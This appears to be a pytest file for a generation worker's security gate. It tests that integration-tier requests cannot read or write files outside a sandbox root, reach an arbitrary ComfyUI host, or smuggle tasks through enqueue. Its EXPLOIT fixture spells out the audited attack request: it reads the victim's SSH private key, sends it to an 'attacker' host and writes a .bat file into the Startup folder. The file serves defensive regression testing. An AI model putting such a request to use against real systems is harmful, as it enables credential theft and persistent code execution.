"""The integration tier bounds what a permitted command may CARRY, not only which command it is.

Security audit finding 1, 2026-09-01. ``INTEGRATION_COMMANDS`` restricted a token holder to
generation, queue observation and status -- and three request fields those commands honour without
restriction turned that into arbitrary local file read and write:

    comfy_api_url   ensure_running accepts any host answering 200 on /system_stats
    input_image     _upload_comfy_image reads ANY local file (only is_file() is checked)
    output          _download_comfy_asset writes whatever /view returns to that path

One ``i2i`` request: upload ``~/.ssh/id_rsa`` to an attacker's host, then write the attacker's
bytes into the Startup folder. That is the class of action the tier was written to exclude, reached
through a command it allows. ``enqueue`` additionally widened the surface: ``permits`` checked the
outer command while ``QueueManager.enqueue`` admitted ``comfy_workflow`` and every video route
underneath it.

Two properties are asserted here. First, the request-level gate itself -- what it refuses, what it
lets through, and that LOCAL_TRUSTED is never inspected. Second, and the reason this is a tree-wide
test rather than a unit test: every path-like request key the generation code actually reads is
covered by one of the two field sets, so a new ``req.get("some_path")`` in a runner fails here
rather than silently opening the boundary again.

Findings 6 and 7 ride along: the token must not reach the job archive, and a traceback must not
reach an integration caller.
"""
from __future__ import annotations

import ast
import re
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "python"))
sys.path.insert(0, str(ROOT / "tests"))

import worker_auth  # noqa: E402
from worker_auth import (  # noqa: E402
    INTEGRATION,
    INTEGRATION_FORBIDDEN_FIELDS,
    INTEGRATION_LOCAL_INPUT_FIELDS,
    INTEGRATION_QUEUE_TASKS,
    INTEGRATION_ROOT_ENV,
    LOCAL_TRUSTED,
    integration_root,
    request_violations,
)

# The request from the audit, verbatim in shape.
EXPLOIT = {
    "command": "i2i",
    "model_family": "flux",
    "model": "x.safetensors",
    "input_image": r"C:\Users\victim\.ssh\id_rsa",
    "comfy_api_url": "http://attacker:80",
    "output": r"C:\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\run.bat",
}


@pytest.fixture
def root(tmp_path, monkeypatch):
    """A real integration root on disk, so containment is tested against resolved paths rather
    than string prefixes."""
    monkeypatch.setenv(INTEGRATION_ROOT_ENV, str(tmp_path))
    (tmp_path / "in").mkdir()
    (tmp_path / "in" / "ref.png").write_bytes(b"\x89PNG")
    return tmp_path


# --- the audit's request ---------------------------------------------------------------------

def test_the_exploit_request_is_refused_on_every_axis(root) -> None:
    reasons = request_violations(INTEGRATION, "i2i", EXPLOIT)
    joined = " ".join(reasons)
    assert "comfy_api_url" in joined
    assert "input_image" in joined
    assert "'output'" in joined
    assert len(reasons) == 3


def test_the_same_request_from_the_local_ui_is_not_inspected(root) -> None:
    """The local UI legitimately sets every one of these fields. The gate is for the tier that
    presented a token, and must never make the app's own requests fail."""
    assert request_violations(LOCAL_TRUSTED, "i2i", EXPLOIT) == []


def test_refusal_reasons_never_echo_the_value(root) -> None:
    """An output path or an input path is itself information about this machine."""
    reasons = " ".join(request_violations(INTEGRATION, "i2i", EXPLOIT))
    assert "id_rsa" not in reasons
    assert "Startup" not in reasons
    assert "attacker" not in reasons


# --- the forbidden fields ----------------------------------------------------------------------

@pytest.mark.parametrize("field", sorted(INTEGRATION_FORBIDDEN_FIELDS))
def test_each_forbidden_field_is_refused_when_present(root, field) -> None:
    reasons = request_violations(INTEGRATION, "t2i", {"command": "t2i", field: "anything"})
    assert any(repr(field) in r for r in reasons), f"{field} was accepted from an integration caller"


@pytest.mark.parametrize("field", sorted(INTEGRATION_FORBIDDEN_FIELDS))
def test_an_empty_forbidden_field_is_not_a_violation(root, field) -> None:
    """Clients serialise absent values as "" or null. Refusing those would make an honest client
    fail for a field it never meant to set."""
    for empty in ("", None):
        assert request_violations(INTEGRATION, "t2i", {"command": "t2i", field: empty}) == []


def test_the_forbidden_set_names_the_three_fields_from_the_audit() -> None:
    assert {"comfy_api_url", "comfy_host", "comfy_port"} <= INTEGRATION_FORBIDDEN_FIELDS
    assert {"comfy_root", "workflow_path", "profile_path", "paths"} <= INTEGRATION_FORBIDDEN_FIELDS


# --- containment ----------------------------------------------------------------------------------

def test_an_output_under_the_root_is_accepted(root) -> None:
    req = {"command": "t2i", "prompt": "x", "output": str(root / "out" / "render.png")}
    assert request_violations(INTEGRATION, "t2i", req) == []


def test_an_output_that_traverses_out_of_the_root_is_refused(root) -> None:
    req = {"command": "t2i", "output": str(root / "out" / ".." / ".." / "escape.png")}
    assert request_violations(INTEGRATION, "t2i", req), "a .. segment escaped the root"


def test_a_prefix_lookalike_is_not_inside_the_root(root) -> None:
    """``C:\\root-evil\\x`` starts with the text of ``C:\\root`` and is not inside it. Containment
    is by path component, never by string prefix."""
    lookalike = Path(str(root) + "-evil") / "x.png"
    req = {"command": "t2i", "output": str(lookalike)}
    assert request_violations(INTEGRATION, "t2i", req)


def test_an_input_under_the_root_is_accepted(root) -> None:
    req = {"command": "i2i", "input_image": str(root / "in" / "ref.png"), "output": str(root / "o.png")}
    assert request_violations(INTEGRATION, "i2i", req) == []


@pytest.mark.parametrize("field", sorted(INTEGRATION_LOCAL_INPUT_FIELDS))
def test_every_local_input_field_is_contained(root, field) -> None:
    req = {"command": "i2i", field: r"C:\Windows\win.ini", "output": str(root / "o.png")}
    reasons = request_violations(INTEGRATION, "i2i", req)
    assert any(repr(field) in r for r in reasons), f"{field} reached outside the root unchallenged"


def test_a_comfy_side_image_name_is_not_a_local_path_and_is_not_checked(root) -> None:
    """``input_image_comfy_name`` refers to a file ComfyUI already holds. It is not read here."""
    req = {"command": "i2i", "input_image_comfy_name": "uploaded.png", "output": str(root / "o.png")}
    assert request_violations(INTEGRATION, "i2i", req) == []


def test_the_default_root_exists_without_configuration(monkeypatch) -> None:
    """With nothing configured the boundary must still be somewhere, not nowhere."""
    monkeypatch.delenv(INTEGRATION_ROOT_ENV, raising=False)
    assert integration_root().name == "integration"


# --- enqueue's inner task -----------------------------------------------------------------------

@pytest.mark.parametrize("task", ["comfy_workflow", "t2v", "i2v", "i23d", "gen3d", "look_complete"])
def test_enqueue_cannot_smuggle_a_task_the_tier_does_not_permit(root, task) -> None:
    """permits() saw only the outer 'enqueue'; the queue admitted the inner task unchecked."""
    reasons = request_violations(INTEGRATION, "enqueue", {"command": "enqueue", "task_command": task})
    assert any("enqueue of task" in r for r in reasons)


@pytest.mark.parametrize("task", sorted(INTEGRATION_QUEUE_TASKS))
def test_enqueue_of_a_permitted_task_passes(root, task) -> None:
    req = {"command": "enqueue", "task_command": task, "output": str(root / "o.png")}
    assert request_violations(INTEGRATION, "enqueue", req) == []


@pytest.mark.parametrize("key", ["task_command", "generation_command", "task"])
def test_every_alias_the_queue_reads_is_the_alias_the_gate_reads(root, key) -> None:
    """QueueManager.enqueue accepts three spellings. If the gate checked only one, the other two
    would be a bypass."""
    reasons = request_violations(INTEGRATION, "enqueue", {"command": "enqueue", key: "comfy_workflow"})
    assert reasons


def test_the_queue_task_set_is_a_subset_of_the_command_set() -> None:
    """A task allowed on the queue but not as a direct command would be two policies."""
    assert INTEGRATION_QUEUE_TASKS <= worker_auth.INTEGRATION_COMMANDS


# --- the tree-wide property: no path-like request key is uncovered ------------------------------

# Modules an INTEGRATION-reachable command executes through.
_GENERATION_MODULES = (
    "native_runners.py", "comfy_prompt_client.py", "image_runners.py",
    "native_image_graphs.py", "worker_queue.py", "worker_service.py",
)
_PATHLIKE = re.compile(r"(?:^|_)(?:path|root|dir|file|image|url|endpoint|host|mask)s?$|^(?:output|paths)$")

# Keys that look path-like and are deliberately NOT gated, each with the reason.
_NOT_A_LOCAL_PATH: dict[str, str] = {
    "input_image_comfy_name": "a name inside ComfyUI's input/ store, not a local path",
    "model": "resolved against the model root by the catalog; never opened as given",
    "vae": "catalog name", "vae_path": "catalog name", "clip": "catalog name", "clip_path": "catalog name",
    "text_encoder": "catalog name", "text_encoder_path": "catalog name", "text_encoder_2_path": "catalog name",
    "unet_path": "catalog name", "lora_path": "catalog name", "high_model_path": "catalog name",
    "low_model_path": "catalog name", "high_noise_path": "catalog name", "low_noise_path": "catalog name",
    "high_noise_model_path": "catalog name", "low_noise_model_path": "catalog name",
    "model_path": "catalog name", "checkpoint_path": "catalog name",
    "repo_url": "read only by install_custom_node, which the tier cannot reach",
    "image": "a base64/URL image field in the vision routes, not a filesystem path",
    "mask_url": "URL, fetched by the remote, never opened locally",
    "native_prompt_api_path": "WRITTEN by the worker (native_runners:109/288), derived from output; never read from the caller",
    "video_has_input_image": "a boolean flag, not a path -- matched by the _image suffix only",
    # Gated by containment against the integration root rather than by membership in a set.
    "output": "contained under integration_root() by request_violations; the one write the tier is allowed",
}


def _request_keys_read(path: Path) -> set[str]:
    """Every literal key passed to ``req.get(...)`` / ``request.get(...)`` / ``req[...]``."""
    try:
        tree = ast.parse(path.read_text(encoding="utf-8", errors="replace"))
    except SyntaxError:
        return set()
    keys: set[str] = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute) and node.func.attr == "get":
            base = node.func.value
            if isinstance(base, ast.Name) and base.id in {"req", "request", "payload"} and node.args:
                first = node.args[0]
                if isinstance(first, ast.Constant) and isinstance(first.value, str):
                    keys.add(first.value)
        if isinstance(node, ast.Subscript) and isinstance(node.value, ast.Name) and node.value.id in {"req", "request"}:
            sl = node.slice
            if isinstance(sl, ast.Constant) and isinstance(sl.value, str):
                keys.add(sl.value)
    return keys


def test_every_pathlike_request_key_the_generation_code_reads_is_covered() -> None:
    """The ratchet. A runner that starts reading ``req.get("scratch_dir")`` tomorrow fails here
    until it is either forbidden, contained, or given a reason it is not a local path."""
    covered = INTEGRATION_FORBIDDEN_FIELDS | INTEGRATION_LOCAL_INPUT_FIELDS | set(_NOT_A_LOCAL_PATH)
    uncovered: dict[str, set[str]] = {}
    for name in _GENERATION_MODULES:
        for key in _request_keys_read(ROOT / "python" / name):
            if _PATHLIKE.search(key) and key not in covered:
                uncovered.setdefault(key, set()).add(name)
    assert not uncovered, (
        "path-like request keys read by generation code with no integration policy: "
        + "; ".join(f"{k} ({', '.join(sorted(v))})" for k, v in sorted(uncovered.items()))
    )


def test_the_not_a_local_path_reasons_describe_keys_that_exist() -> None:
    """An exemption for a key nothing reads is a memo about a past layout."""
    seen: set[str] = set()
    for name in _GENERATION_MODULES:
        seen |= _request_keys_read(ROOT / "python" / name)
    for name in ("worker_tcp.py", "download_commands.py", "model_import.py"):
        seen |= _request_keys_read(ROOT / "python" / name)
    stale = [k for k in _NOT_A_LOCAL_PATH if k not in seen]
    # Tolerated: keys read through helper tuples (VIDEO_*_KEYS) rather than literal .get() calls.
    tolerated = {k for k in stale if k.endswith(("_path", "_name")) or k in {"vae", "clip", "text_encoder", "model", "image", "mask_url"}}
    assert not [k for k in stale if k not in tolerated], f"exemptions for keys nothing reads: {stale}"


# --- findings 6 and 7 ----------------------------------------------------------------------------

def test_the_token_is_redacted_out_of_the_job_archive() -> None:
    """The manifest redacted it. The archive, three lines away, wrote it in the clear -- and the
    archive feeds retry, so the token round-tripped."""
    import worker_service as ws

    source = (ROOT / "python" / "worker_service.py").read_text(encoding="utf-8")
    start = source.index("def archive_job(")
    body = source[start:source.index("\ndef ", start + 10)]
    assert "redact_secrets(clone_request_snapshot(" in body
    assert "redact_secrets" in dir(ws)


def test_the_token_is_dropped_from_the_request_after_classification() -> None:
    source = (ROOT / "python" / "worker_tcp.py").read_text(encoding="utf-8")
    gate = source.index("worker_auth.request_violations(")
    assert "req.pop(worker_auth.TOKEN_FIELD, None)" in source[gate:gate + 1500]


def test_tracebacks_reach_only_the_local_ui() -> None:
    """A traceback is a map of this machine. The gate is the emitter's recorded access level."""
    source = (ROOT / "python" / "worker_tcp.py").read_text(encoding="utf-8")
    assert "if tb and self.access_level == worker_auth.LOCAL_TRUSTED:" in source
    assert "self.access_level = worker_auth.LOCAL_TRUSTED" in source, "the default must be the permissive one"
    assert "emitter.access_level = level" in source
